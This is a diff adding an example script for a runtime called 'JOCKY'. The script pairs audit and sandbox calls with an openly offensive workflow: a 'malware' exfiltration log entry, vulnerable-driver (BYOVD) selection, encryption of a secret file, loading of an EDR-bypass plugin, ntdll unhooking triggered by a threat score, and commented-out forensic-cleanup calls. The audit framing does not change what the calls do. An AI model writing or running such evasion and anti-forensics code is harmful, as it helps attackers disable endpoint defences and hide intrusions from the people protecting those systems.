@@ -1,0 +1,66 @@
+// Example: Using JOCKY Runtime APIs
+// Demonstrates audit, sandbox, driver selection, and forensics cleanup
+
+use jocky.runtime
+
+fn main() {
+    // Initialize audit log for accountability
+    let audit_result = audit_init(100)
+    if audit_result != 0 {
+        println("Failed to initialize audit log")
+        return
+    }
+
+    // Log an action (e.g., operation start)
+    audit_log("malware", "exfil_start", "raw_data_hash", "encrypted_hash")
+
+    // Get OS version for driver selection
+    let os_version = byovd_get_os_version()
+    println("Detected OS version: " + string(os_version))
+
+    // Spawn isolated process for operation
+    let pid = sandbox_spawn("/bin/bash", "-c 'whoami'")
+    if pid > 0 {
+        // Set resource limits (100 MB memory, 30 second timeout)
+        sandbox_set_limits(pid, 100 * 1024 * 1024, 30000)
+
+        // Monitor for suspicious activity
+        let has_anomaly = sandbox_monitor(pid)
+
+        // Wait for completion
+        sandbox_wait(pid)
+
+        // Export audit trail
+        sandbox_export_trace(pid, "/tmp/sandbox_audit.txt")
+    }
+
+    // Record data transformation
+    provenance_record("/home/user/secret.txt", "aes256_encrypt", "/tmp/encrypted")
+
+    // Load plugin for additional evasion
+    let plugin_handle = plugin_load("/opt/jocky/plugins/edr_bypass.so")
+    if plugin_handle > 0 {
+        plugin_run(plugin_handle, "--aggressive")
+        plugin_unload(plugin_handle)
+    }
+
+    // Get AI threat assessment
+    let threat_score = ai_score_threat()
+    println("Threat score: " + string(threat_score))
+
+    // If threat is high, activate aggressive evasion
+    if threat_score > 0.7 {
+        edrhoker_detect()
+        blindside_unhook_ntdll()
+    }
+
+    // Cleanup forensic traces (dangerous!)
+    // forensics_cleanup_all()
+    // linux_forensics_cleanup_all()
+
+    // Export audit log for review
+    audit_export("/tmp/audit_trail.bin")
+
+    // Verify audit chain integrity
+    audit_verify()
+}
